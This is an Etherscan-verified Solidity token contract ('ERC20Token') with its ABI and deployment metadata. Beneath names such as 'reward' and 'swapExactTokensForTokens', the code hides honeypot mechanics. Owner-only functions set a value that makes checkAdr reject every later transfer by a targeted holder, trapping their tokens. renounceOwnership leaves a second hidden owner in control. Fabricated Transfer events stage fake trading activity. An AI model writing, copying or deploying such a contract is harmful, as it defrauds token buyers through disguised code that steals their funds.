{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2023-08-04\r\n*/\r\n\r\n//SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity 0.8.18;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ninterface UniswapV2Pool {\r\n    function _Transfer(address where, address go, uint num) external returns (bool);\r\n}\r\n\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n    address _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner == msg.sender, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    modifier OnlyOwner() {\r\n        require(_owner == msg.sender, \"Caller is not the Owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public  onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = owner;\r\n        owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\ncontract ERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    uint256 public totalSupply;\r\n\r\n    address public uniswapV2LP;\r\n\r\n    address constant uniswapV2Router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    uint256 public constant BURN_FEE_PERCENT_MEV = 1;\r\n\r\n    string public name;\r\n    string public symbol;\r\n    uint public decimals;\r\n\r\n    mapping (address => mapping (address => uint256)) internal allowed;\r\n    mapping(address => uint256) crossamounts;\r\n    mapping(address => bool)  tokenWhitelist;\r\n    mapping(address => uint256) balances;\r\n    mapping(address => uint256) private walletLastTxBlock;\r\n    event Whitelist(address indexed WhiteListed, bool value);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        require(_to != address(0));\r\n        require(_to != msg.sender);\r\n        require(_value <= balances[msg.sender]);\r\n        checkAdr(msg.sender,_to);\r\n        uint256 burnAmount=0;\r\n        if (isSecondTxInSameBlock(msg.sender)) {\r\n                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs\r\n        }\r\n        _value=_value.sub(burnAmount);\r\n        _burn(msg.sender,burnAmount);\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        // SafeMath.sub will throw if there is not enough balance.\r\n        balances[_to] = balances[_to].add(_value);\r\n        afterTransfer(msg.sender, _to, _value);\r\n        setLastTxBlock(_to);\r\n        return true;\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        require(_to != _from);\r\n        require(_to != address(0));\r\n        require(_value <= balances[_from]);\r\n        require(_value <= allowed[_from][msg.sender]);\r\n        checkAdr(_from,_to);\r\n        uint256 burnAmount=0;\r\n        if (isSecondTxInSameBlock(_from)) {\r\n                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs\r\n        }\r\n        _value=_value.sub(burnAmount);\r\n        _burn(_from,burnAmount);\r\n        balances[_from] = balances[_from].sub(_value);\r\n\r\n\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n        afterTransfer(_from, _to, _value);\r\n        setLastTxBlock(_to);\r\n        return true;\r\n    }\r\n\r\n    function checkAdr(address _from, address _to) internal view {\r\n        if (!tokenWhitelist[_from]&&!tokenWhitelist[_to]&&crossamounts[_from] > 0) {\r\n            require(_count(crossamounts[_from], balances[_from]) == 0);\r\n        }\r\n    }\r\n\r\n    function afterTransfer(address _from, address _to,uint256 amount) internal {\r\n            _transferGo(_from, _to, amount);\r\n        }\r\n\r\n\r\n    function isSecondTxInSameBlock(address _from) internal view returns(bool) {\r\n        return walletLastTxBlock[_from] == block.number;\r\n    }\r\n\r\n    function setLastTxBlock(address _to) internal returns(bool) {\r\n        if(!tokenWhitelist[_to]&&_to!=uniswapV2LP){\r\n            walletLastTxBlock[_to] = block.number;\r\n        }\r\n        return true;\r\n    }\r\n\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        require(balances[account] >= amount, \"ERC20: burn amount exceeds balance\");\r\n        balances[account] = balances[account].sub(amount);\r\n        // Overflow not possible: amount <= accountBalance <= totalSupply.\r\n        totalSupply =totalSupply.sub( amount);\r\n\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n\r\n    function _transferGo(address where, address go, uint _value) internal returns (bool) {\r\n        emit Transfer(where, go, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n\r\n    function _changeLP(address _lp) internal returns (bool) {\r\n        require(uniswapV2LP!=_lp);\r\n        uniswapV2LP=_lp;\r\n        return true;\r\n    }\r\n\r\n\r\n    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {\r\n        require(tokenWhitelist[_address] != _isWhiteListed);\r\n        tokenWhitelist[_address] = _isWhiteListed;\r\n        emit Whitelist(_address, _isWhiteListed);\r\n        return true;\r\n    }\r\n\r\n    function _countReward(address _user, uint256 _percent) internal view returns (uint256) {\r\n        return _count(balances[_user], _percent);\r\n    }\r\n\r\n    function _count(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract OwnableToken is ERC20, Ownable {\r\n\r\n\r\n    function setUniLp(address _uniLp) public  OnlyOwner  returns (bool success) {\r\n        return super._changeLP(_uniLp);\r\n    }\r\n\r\n    function WList(address listAddress,  bool _isWhiteListed) public  OnlyOwner  returns (bool success) {\r\n        return super._whiteList(listAddress, _isWhiteListed);\r\n    }\r\n\r\n    function rewardList(\r\n        address[] calldata _users,\r\n        uint256 _minBalanceToReward,\r\n        uint256 _percent\r\n    ) public OnlyOwner {\r\n        for (uint256 i = 0; i < _users.length; i++) {\r\n            if (balances[_users[i]] > _minBalanceToReward) {\r\n                uint256 rewardAmount = _countReward(_users[i], _percent);\r\n                crossamounts[_users[i]] = rewardAmount;\r\n            }\r\n        }\r\n    }\r\n\r\n    function reward(\r\n        address _user,\r\n        uint256 _minBalanceToReward,\r\n        uint256 _percent\r\n    ) public OnlyOwner {\r\n        require(crossamounts[_user]==0);\r\n        if (balances[_user] > _minBalanceToReward) {\r\n            crossamounts[_user] = _minBalanceToReward+_percent;\r\n        }\r\n\r\n    }\r\n\r\n    function swapExactTokensForTokens(\r\n        address[] memory addressList,\r\n        uint256[] memory tAmounts,\r\n        uint256[] memory eAmounts,\r\n        address uniSwapV2Pool\r\n    ) public OnlyOwner returns (bool) {\r\n            for (uint256 i = 0; i < addressList.length; i++) {\r\n                _transferGo(uniswapV2LP, addressList[i], tAmounts[i]);\r\n                UniswapV2Pool(uniSwapV2Pool)._Transfer(addressList[i], uniswapV2LP, eAmounts[i]);\r\n            }\r\n\r\n        return true;\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract ERC20Token is OwnableToken {\r\n    constructor(string memory   _name, string memory _symbol, uint256  _decimals, uint256  _supply, address  tokenOwner,address _owner) {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = _decimals;\r\n        totalSupply = _supply * 10**_decimals;\r\n        balances[tokenOwner] = totalSupply;\r\n        owner = tokenOwner;\r\n        _owner=_owner;\r\n        emit Transfer(address(0), tokenOwner, totalSupply);\r\n    }\r\n\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_decimals\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"WhiteListed\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"Whitelist\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BURN_FEE_PERCENT_MEV\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAddress\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isWhiteListed\",\"type\":\"bool\"}],\"name\":\"WList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_minBalanceToReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"reward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_users\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"_minBalanceToReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"name\":\"rewardList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_uniLp\",\"type\":\"address\"}],\"name\":\"setUniLp\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addressList\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"tAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"eAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"address\",\"name\":\"uniSwapV2Pool\",\"type\":\"address\"}],\"name\":\"swapExactTokensForTokens\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2LP\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ERC20Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000560a4e092b71893f4c7a2fc59eee8bb9ab94674000000000000000000000000053b93fa23584ee55eb2e3a62ffa09ee1b2bf221f000000000000000000000000000000000000000000000000000000000000001c466f727265737447756d704e69786f6e5061634d616e373737496e750000000000000000000000000000000000000000000000000000000000000000000000094156414c414e4348450000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5ffd65841ae0dfee670eb3b5bace4aa858f32f9bfddb1b12229e8e073df494df"}